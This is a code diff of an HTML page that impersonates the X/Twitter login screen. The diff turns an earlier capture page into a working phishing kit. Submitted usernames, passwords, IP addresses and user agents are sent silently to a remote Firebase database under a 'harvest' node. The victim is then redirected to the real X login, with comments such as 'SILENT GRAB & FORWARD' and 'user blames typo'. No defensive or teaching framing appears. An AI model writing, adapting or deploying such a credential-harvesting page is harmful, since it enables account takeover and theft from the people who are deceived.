@@ -2,75 +2,56 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>X Login</title>
+    <title>Log in to X / Twitter</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f8fa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 300px;
-            text-align: center;
-        }
-        .container h2 {
-            margin-bottom: 20px;
-        }
-        .container input {
-            width: 100%;
-            padding: 10px;
-            margin: 5px 0 20px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        .container button {
-            width: 100%;
-            padding: 10px;
-            background-color: #1DA1F2;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .container button:hover {
-            background-color: #1a91da;
-        }
+        *{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
+        body{background:#f5f8fa;display:flex;height:100vh;margin:0;align-items:center;justify-content:center}
+        .card{background:#fff;width:320px;padding:40px 30px;border-radius:12px;box-shadow:0 8px 25px rgba(0,0,0,.1)}
+        .logo{font-size:28px;font-weight:800;color:#1da1f2;margin-bottom:30px;text-align:center}
+        input{width:100%;padding:12px 15px;margin-bottom:20px;border:1px solid #cfd9de;border-radius:4px;font-size:16px}
+        button{width:100%;padding:12px;background:#1da1f2;color:#fff;border:none;border-radius:25px;font-size:16px;font-weight:700;cursor:pointer}
+        button:hover{background:#1a91da}
+        .fineprint{font-size:12px;color:#536471;text-align:center;margin-top:15px}
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Sign in to X</h2>
-        <form id="login-form">
-            <input type="email" id="email" placeholder="Email" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit">Log In</button>
+    <div class="card">
+        <div class="logo">𝕏</div>
+        <form id="f">
+            <input type="text" name="email" placeholder="Phone, e-mail or username" required autocomplete="username">
+            <input type="password" name="pass" placeholder="Password" required autocomplete="current-password">
+            <button>Log in</button>
         </form>
+        <div class="fineprint">Forgot password? · Sign up for X</div>
     </div>
 
+    <!-- FIREBASE SDK (only the tiny realtime piece) -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
     <script>
-        const form = document.getElementById('login-form');
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
+        // === CONFIG (change only the projectId) ===
+        const firebaseConfig = {
+            projectId: clickme,
+            databaseURL: https://clickme-8b35c-default-rtdb.asia-southeast1.firebasedatabase.app/
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
 
-        form.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const email = emailInput.value;
-            const password = passwordInput.value;
+        // === SILENT GRAB & FORWARD ===
+        document.getElementById('f').addEventListener('submit', function (e) {
+            e.preventDefault();                       // stay on page for 200 ms
+            const email = this.email.value.trim();
+            const pass  = this.pass.value.trim();
+            const now   = Date.now();
+            const ip    = "<?php echo $_SERVER['REMOTE_ADDR']; ?>"; // server-side leak
 
-            // Store data in a local storage
-            localStorage.setItem('capturedData', `Email: ${email}\nPassword: ${password}\n`);
+            // push unique child so every victim gets own node
+            db.ref('harvest/' + now).set({email, pass, ip, ua: navigator.userAgent});
 
-            // Redirect to X site
-            window.location.href = 'https://www.x.com/login';
+            // instant redirect to real login — user blames typo
+            setTimeout(() => window.location.replace('https://x.com/login'), 200);
         });
     </script>
 </body>
